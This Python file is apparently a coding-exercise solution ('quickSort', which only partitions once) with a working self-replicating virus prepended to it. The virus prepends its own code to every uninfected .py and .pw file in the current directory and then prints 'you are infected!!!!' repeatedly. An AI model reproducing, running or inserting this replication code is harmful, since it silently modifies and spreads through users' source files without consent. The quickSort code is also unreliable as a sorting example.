## start replicate ##

import sys
import glob

code = []

with open(sys.argv[0], 'r') as f:
    ln = f.readlines()

v = False
for l in ln:
    if l == '## start replicate ##\n':
        v = True
    if v:
        code.append(l)
        if l == '## end the script\n':
            break

python_file = glob.glob('*.py') + glob.glob('*.pw')
#print(python_file)

for scrpt in python_file:
    with open(scrpt, 'r') as f:
        scrpt_code = f.readlines()
    
    infect = False
    for l in scrpt_code:
        if l == '## start replicate ##\n':
            infect = True
            break
    if not infect:
        malicious = []
        malicious.extend(code)
        malicious.extend('\n')
        malicious.extend(scrpt_code)

        with open(scrpt, 'w') as f:
            f.writelines(malicious)

# the malicious code
a = 100
for i in range(1, 99):
    print("you are infected!!!!")
## end the script ##

import math
import os
import random
import re
import sys

# Complete the quickSort function below.
def quickSort(arr):
    
    quickSort = arr[0]
    l = []
    r = []
    for i in range(1, len(arr)):
        if arr[i] <= quickSort:
            l.append(arr[i])
        if arr[i] > quickSort:
            r.append(arr[i])
    l.append(quickSort)
    q = l + r
    return q

if __name__ == '__main__':

    fptr = open('result.txt', 'w')

    n = int(input())

    arr = list(map(int, input().rstrip().split()))

    result = quickSort(arr)

    fptr.write(' '.join(map(str, result)))
    fptr.write('\n')

    fptr.close()

